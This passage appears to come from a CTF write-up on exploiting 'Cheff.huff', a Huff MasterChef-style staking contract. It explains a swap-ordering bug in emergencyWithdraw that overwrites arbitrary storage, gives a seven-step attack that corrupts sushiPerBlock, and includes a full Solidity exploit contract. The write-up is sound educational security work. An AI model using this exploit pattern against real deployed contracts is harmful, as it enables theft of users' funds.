    UserInfo storage user = userInfo[pid][msg.sender];
    uint256 amount = user.amount;

    pool.lpToken.safeTransfer(msg.sender, amount);

    emit EmergencyWithdraw(msg.sender, pid, amount);

    assembly {
        sstore(user.amount, user.rewardDebt)
        // @audit-issue: Storing user.rewardDebt at slot number user.amount
        // This overwrites arbitrary storage slots instead of resetting user state
    }
    user.amount = 0;
}
```
{%end%}

The Solidity equivalent demonstrates how the vulnerability translates to high-level code using inline assembly to expose the incorrect storage operations.

The final storage operations exhibit undefined behavior due to incorrect stack manipulation. Instead of properly zeroing user storage, the code writes to arbitrary storage locations. 

---


### Cheff Contract Functionality Overview

Cheff is a yield farming protocol that implements a MasterChef-style staking rewards system in Huff. The protocol allows users to stake LP (Liquidity Provider) tokens from various pools and earn SUSHI token rewards proportional to their stake and the pool's allocation weight. The contract manages multiple staking pools, each with configurable allocation points that determine the share of SUSHI rewards distributed to that pool's stakers.

Each pool represents a different LP token that users can stake. Pools are identified by a pool ID (pid) and contain:

- **lpToken**: The ERC20 LP token address users stake
- **allocPoint**: Allocation points determining the pool's share of total SUSHI rewards
- **lastRewardBlock**: The last block number where reward distribution was calculated
- **accSushiPerShare**: Accumulated SUSHI rewards per staked LP token (scaled by 1e12 for precision)

For each pool, users have a position tracked by:

- **amount**: The quantity of LP tokens the user has staked
- **rewardDebt**: A checkpoint value used to calculate pending rewards (explained below)

Reward distribution parameters : 

- **sushiPerBlock**: The amount of SUSHI tokens minted and distributed per block
- **totalAllocPoint**: Sum of all pool allocation points, used to calculate each pool's proportional share
- **bonusEndBlock**: Block number where bonus rewards end
- **BONUS_MULTIPLIER**: Multiplier (10x) applied to rewards during the bonus period

Instead of tracking individual rewards for each user (which would be gas-prohibitive), Cheff uses an elegant accumulated rewards approach:

1. **Pool-Level Accumulation**: Each pool maintains `accSushiPerShare` which represents the total SUSHI rewards accumulated per LP token since the pool's inception.

2. **Periodic Updates**: When `updatePool()` is called (triggered by deposits, withdrawals, or manual calls), the contract:
   - Calculates blocks elapsed since `lastRewardBlock`
   - Determines the block multiplier (10x during bonus period, 1x after)
   - Computes new SUSHI rewards: `multiplier × sushiPerBlock × pool.allocPoint ÷ totalAllocPoint`
   - Mints new SUSHI: 10% to developer, 100% to the Cheff contract
   - Updates `accSushiPerShare`: adds `(newRewards × 1e12) ÷ lpSupply` to the existing value
   - Updates `lastRewardBlock` to current block

The `rewardDebt` is a checkpoint that prevents users from claiming rewards they didn't earn:

- **On Deposit**: `rewardDebt = user.amount × pool.accSushiPerShare ÷ 1e12`
  - This records the accumulated rewards "baseline" at deposit time

- **Pending Rewards Calculation**:
  
```
  pending = (user.amount × pool.accSushiPerShare ÷ 1e12) - user.rewardDebt
```

- This gives only the rewards accumulated since the user's last interaction

- **On Withdrawal**: After claiming pending rewards, `rewardDebt` is recalculated based on remaining stake

- **emergencyWithdraw(pid)**: Allows users to withdraw all LP tokens without claiming rewards.

## Breaking the Cheff.huff

### Challenge Goal

The objective is to accumulate more than 1,000,000 SUSHI tokens (1,000,000 * 10^18 wei) in the player's wallet. The `isSolved()` function verifies success by checking if `sushi.balanceOf(player) > 1_000_000 * 1e18` returns true. The player address is set during contract deployment and cannot be changed, requiring exploitation of the contract's vulnerabilities to extract sufficient SUSHI rewards without legitimate staking.

### The Vulnerability

The critical bug resides in the `EMERGENCY_WITHDRAW()` function's final storage reset sequence. After emitting the EmergencyWithdraw event via `log3`, the function attempts to zero out the user's position by resetting `user.amount` and `user.rewardDebt` to 0. However, incorrect stack manipulation using `swap3` and `swap1` operations causes a catastrophic misalignment.

**Intended Behavior:**

```huff
storage[user_slot] = 0        // Reset user.amount to 0
storage[user_slot + 1] = 0    // Reset user.rewardDebt to 0
```

**Actual Behavior:**

```huff
// Stack after log3: [user.amount, user_slot, user.rewardDebt]
0x00                          // [0x00, user.amount, user_slot, user.rewardDebt]
swap3                         // [user.rewardDebt, user.amount, user_slot, 0x00]
swap1                         // [user.amount, user.rewardDebt, user_slot, 0x00]
sstore                        // storage[user.amount] = user.rewardDebt @audit-issue : BUG
sstore                        // storage[user_slot] = 0x00 
```

The first `sstore` uses `user.amount` as the storage slot key instead of `user_slot`, writing `user.rewardDebt` to an arbitrary storage location. The second `sstore` correctly zeros `user.amount`, but the damage is done.

### Exploitation Strategy

By depositing a carefully chosen amount `X` into any pool, an attacker controls which storage slot gets overwritten during `emergencyWithdraw()`. For example:
- Deposit `amount = 0` → `storage[0] = user.rewardDebt` → Overwrites `SUSHI_SLOT`
- Deposit `amount = 1` → `storage[1] = user.rewardDebt` → Overwrites `DEVADDR_SLOT`
- Deposit `amount = N` → `storage[N] = user.rewardDebt` → Overwrites slot N

The goal is to accumulate over 1,000,000 SUSHI tokens. The most effective target is slot 3 (`SUSHI_PER_BLOCK_SLOT`). Corrupting `sushiPerBlock` to an astronomically large value causes the contract to mint excessive rewards on subsequent pool updates.

Two values must be controlled:
1. `user.amount = 3` determines which slot gets overwritten
2. `user.rewardDebt` determines the value written to that slot

The `rewardDebt` is calculated as:

```
rewardDebt = user.amount × pool.accSushiPerShare ÷ 1e12
```

To maximize `rewardDebt`, we need `accSushiPerShare` to be extremely large. The `accSushiPerShare` grows according to:

```
accSushiPerShare += (sushiReward × 1e12) ÷ lpSupply
```

When `lpSupply` equals 1 wei, every reward gets multiplied by 1e12 before accumulation. This is the key insight: deposit the minimum possible LP to inflate `accSushiPerShare` rapidly.

### Attack Sequence

**Step 1**: Approve LP tokens for the Cheff contract.

**Step 2**: Deposit 1 wei of LP tokens into pool 0. This sets `lpSupply = 1`, maximizing the rate at which `accSushiPerShare` accumulates.

**Step 3**: Wait for blocks to pass. Each block accumulates rewards as:

```
sushiReward = multiplier × sushiPerBlock × allocPoint ÷ totalAllocPoint
accSushiPerShare += sushiReward × 1e12 ÷ 1
```

With `lpSupply = 1`, the `accSushiPerShare` grows by approximately `1e30` or more per block during the bonus period.

**Step 4**: Deposit 2 additional wei of LP tokens. This updates `user.amount` to 3 and recalculates `rewardDebt`:

```
user.amount = 1 + 2 = 3
user.rewardDebt = 3 × accSushiPerShare ÷ 1e12
```

With `accSushiPerShare ≈ 1e35`, the resulting `rewardDebt ≈ 3e23`.

**Step 5**: Call `emergencyWithdraw(0)`. The buggy storage operation executes:

```
storage[3] = user.rewardDebt  // sushiPerBlock = 3e23
```

The contract returns the 3 wei of LP tokens to the attacker.

**Step 6**: Deposit the remaining LP tokens (approximately 1 ether minus 3 wei) into pool 0.

**Step 7**: Wait for one block to pass, then call `withdraw(0, 0)` to claim rewards without withdrawing LP. With `sushiPerBlock = 3e23`, a single block generates:

```
sushiReward = 10 × 3e23 × 100 ÷ 100 = 3e24 SUSHI
```

This exceeds the 1,000,000 SUSHI (1e24 wei) threshold required to solve the challenge.

An alternative attack vector targets slot 2 (`BONUS_END_BLOCK_SLOT`). By setting `user.amount = 2` and triggering the bug, the attacker overwrites `bonusEndBlock` with a large value, extending the 10x bonus multiplier indefinitely. This approach requires more blocks to accumulate sufficient rewards but avoids direct manipulation of the reward rate.

## The Exploit

{% note(clickable=true, hidden=true, header="Exploit POC") %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ICheff} from "./ICheff.sol";
import {IERC20} from "./IERC20.sol";

contract Exploit {
    ICheff public immutable cheff;
    IERC20 public immutable lpToken;
    IERC20 public immutable sushi;

    constructor(address _cheff, address _lpToken, address _sushi) {
        cheff = ICheff(_cheff);
        lpToken = IERC20(_lpToken);
        sushi = IERC20(_sushi);
    }

    function attack() external {
        // Step 1: Approve LP tokens
        lpToken.approve(address(cheff), type(uint256).max);

        // Step 2: Deposit 1 wei to minimize lpSupply
        // This maximizes accSushiPerShare growth rate
        cheff.deposit(0, 1);

        // Step 3: Blocks pass naturally on testnet
        // accSushiPerShare inflates due to lpSupply = 1

        // Step 4: Deposit 2 more wei to set user.amount = 3
        // rewardDebt = 3 × accSushiPerShare ÷ 1e12
        cheff.deposit(0, 2);

        // Step 5: Trigger the bug
        // storage[user.amount] = user.rewardDebt
        // storage[3] = huge value → corrupts sushiPerBlock
        cheff.emergencyWithdraw(0);

        // Step 6: Deposit remaining LP tokens
        uint256 remaining = lpToken.balanceOf(address(this));
        cheff.deposit(0, remaining);
    }

    function claim() external {
        // Step 7: Claim rewards after one block passes
        cheff.withdraw(0, 0);

        // Transfer SUSHI to caller/player
        sushi.transfer(msg.sender, sushi.balanceOf(address(this)));
    }
}
```
{%end%}

The exploit splits into two transactions: `attack()` sets up the corrupted state, and `claim()` harvests rewards after at least one block passes. The separation ensures the pool updates with the inflated `sushiPerBlock` value before claiming.

## Conclusion

Huff enables gas optimization beyond what Solidity can achieve, but eliminates the compiler's safety guardrails. Stack manipulation errors like incorrect `swap` or `dup` operations can silently corrupt storage in ways that high-level languages prevent through type systems and automatic storage management. Use Huff only when gas savings justify the increased audit cost and development complexity, typically for hot paths in high-throughput contracts like DEX routers or optimized libraries. For most applications, Solidity's safety features and developer tooling provide better long-term maintainability.

## References


- [Huff documentation](https://docs.huff.sh/get-started/)
- CTF writeups to learn EVM internals : [1](https://themj0ln1r.github.io/archive/hackedlabsctf/), [2](https://themj0ln1r.github.io/archive/tcp1pctf/) , [3](https://themj0ln1r.github.io/archive/ethernaut/#18-magic-number), [4](https://themj0ln1r.github.io/archive/backdoorctf24/)
- [How MasterChef reward calculations works](https://dev.to/heymarkkop/understanding-sushiswaps-masterchef-staking-rewards-1m6f)
- [EVM Through HUFF: Devtooligan](https://www.youtube.com/watch?v=Rfaabjj7n9k)
- [devtooligan/awesome-huff](https://github.com/devtooligan/awesome-huff)